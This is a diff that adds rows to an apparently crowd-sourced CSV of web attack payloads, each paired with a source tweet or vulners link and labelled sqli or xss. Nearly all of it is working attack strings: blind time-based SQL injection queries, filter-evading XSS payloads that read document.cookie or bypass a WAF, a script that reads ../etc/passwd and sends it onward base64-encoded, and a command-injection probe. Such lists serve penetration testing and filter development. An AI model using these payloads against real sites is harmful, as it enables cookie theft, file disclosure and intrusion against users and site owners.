@@ -496,3 +496,24 @@ https://twitter.com/RootMoksha/status/1770379210705838114,&#34;&gt;&lt;track/one
 https://vulners.com/githubexploit/8292EFB2-7D48-5269-85E0-90F582B0CF95?utm_source=rss&utm_medium=rss&utm_campaign=rss,SELECT CASE WHEN LENGTH((SELECT GROUP_CONCAT({column_name}) FROM {from_where} where table_schema = '{where}'))={i} THEN sleep(3) ELSE sleep(0) END,sqli
 https://vulners.com/githubexploit/8292EFB2-7D48-5269-85E0-90F582B0CF95?utm_source=rss&utm_medium=rss&utm_campaign=rss,SELECT CASE WHEN LENGTH((SELECT GROUP_CONCAT({column_name}) FROM {from_where} where table_schema = '{where}' and table_name = '{where2}'))={i} THEN sleep(3) ELSE sleep(0) END,sqli
 https://vulners.com/githubexploit/7A6411F4-C896-52AB-9725-D10DEBF9CD0F?utm_source=rss&utm_medium=rss&utm_campaign=rss,clicks%60%3DIF%28SUBSTRING%28version%28%29%2C1%2C1%29%3D5%2CSLEEP%2810%29%2Cnull%29--%20-,sqli
+https://twitter.com/TakSec/status/1786074467728515132, 1'"&gt;&lt;A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)&gt;,xss
+https://twitter.com/KN0X55/status/1786022967933046971, <A HRef=\" AutoFocus OnFocus=top/**/?.['al'%2B'ert'](1)>,xss
+https://twitter.com/PrinceOker79109/status/1786548416010498123, <Img Src=OnXSS OnError=confirm("Hacked_by_a7madn1")>,xss
+https://twitter.com/XssPayloads/status/1788748656390058340, &lt;foo%20bar=%250a%20onclick=&lt;your js code&gt;,xss
+https://twitter.com/Dharamveer_____/status/1788492033675440375, %3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E,xss
+https://twitter.com/Dharamveer_____/status/1788492033675440375https://twitter.com/NinadMishra5/status/1790318182680740336, `"//><script>alert()</script>,xss
+https://twitter.com/its_Loksh_P/status/1792006779783848407, alert = window["al"+"ert"],xss
+https://twitter.com/Sharo_k_h/status/1792235995154514276, <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>,xss
+https://twitter.com/0xRAYAN7/status/1793217107544424474, <svg onload=alert&#0000000040document.cookie> <svg/oNLY=1/**/On+ONLoaD=co\u006efirm&\#x28;\#x29;> <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NLZCA6KQ=="))>,xss
+https://twitter.com/0xRAYAN7/status/1793217107544424474, &lt;svg/oNLY%3d1/**/On+ONLoaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b&gt;,xss
+https://twitter.com/0xRAYAN7/status/1793217107544424474, &lt;Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NLZCA6KQ=="))&gt;,xss
+https://vulners.com/githubexploit/C99986A2-7B57-5939-9BD1-AA95A6572AF3?utm_source=rss&utm_medium=rss&utm_campaign=rss, ;echo 1337; die;,xss
+https://twitter.com/t0t3kingpad4/status/1800833416491049416, "/&gt;&lt;​/script&gt;&lt;​script&gt;alert(document.domain)&lt;​/script&gt;,xss
+https://twitter.com/cyber_advising/status/1804119011086549017, <script>fetch('/json_api.php?query[]=../etc/passwd').then(r => r.text()).then(t => fetch('/json_api.php?query[]=../rspamd_custom_maps/'+btoa(t)))</script>,xss
+https://twitter.com/RootMoksha/status/1804523003235225830, <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">,xss
+https://twitter.com/RootMoksha/status/1804523003235225830, <svg/onload=alert/*1337*/(1)>,xss
+https://twitter.com/RootMoksha/status/1804523003235225830, &lt;svg/onload=alert//&amp;NewLine;(2)&gt;,xss
+https://twitter.com/RootMoksha/status/1804523003235225830, &lt;svg/onload=alert&amp;sol;**&amp;sol;(3)&gt;,xss
+https://twitter.com/RootMoksha/status/1804523003235225830, &lt;svg/onload=alert/&amp;#42;&amp;#42;/(4)&gt;,xss
+https://twitter.com/RootMoksha/status/1804523003235225830, &lt;svg/onload=alert&amp;#x2F;**&amp;#47;(5)&gt;,xss
+https://twitter.com/XssPayloads/status/1805805676662255918, <img hrEF="x" sRC="data:x" oNLy=1 oNErrOR=prompt`1`>,xss
